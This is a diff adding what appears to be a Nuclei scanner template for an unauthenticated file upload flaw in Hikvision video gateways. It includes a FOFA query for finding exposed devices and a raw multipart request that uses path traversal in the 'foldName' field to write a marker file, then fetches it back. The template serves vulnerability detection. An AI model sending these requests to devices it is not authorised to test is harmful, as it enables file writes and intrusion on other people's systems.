@@ -1,0 +1,44 @@
+id: hikvision-video-gateway-file-upload
+
+info:
+  name: Hikvision Video Gateway File Upload
+  author: zp857
+  severity: critical
+  tags: hikvision,fileupload,hikvision-video-gateway
+  metadata:
+    fofa-query: 'body="/bncgi-bin/test.pl" || title="视频编码设备接入网关"'
+
+requests:
+  - raw:
+      - |
+        POST /data/uploadPlug.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryexx1M5XeGbb0u4wB
+
+        ------WebKitFormBoundaryexx1M5XeGbb0u4wB
+        Content-Disposition: form-data; name="foldName"
+
+        ../pag/web/html/data/4rCtIlcQ/
+        ------WebKitFormBoundaryexx1M5XeGbb0u4wB
+        Content-Disposition: form-data; name="plugFile[]"; filename="1.txt"
+
+        zp857
+        ------WebKitFormBoundaryexx1M5XeGbb0u4wB
+        Content-Disposition: form-data; name="submit"
+
+        submit
+        ------WebKitFormBoundaryexx1M5XeGbb0u4wB--
+
+      - |
+        GET /data/4rCtIlcQ/1.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "zp857"
+
+      - type: status
+        status:
+          - 200
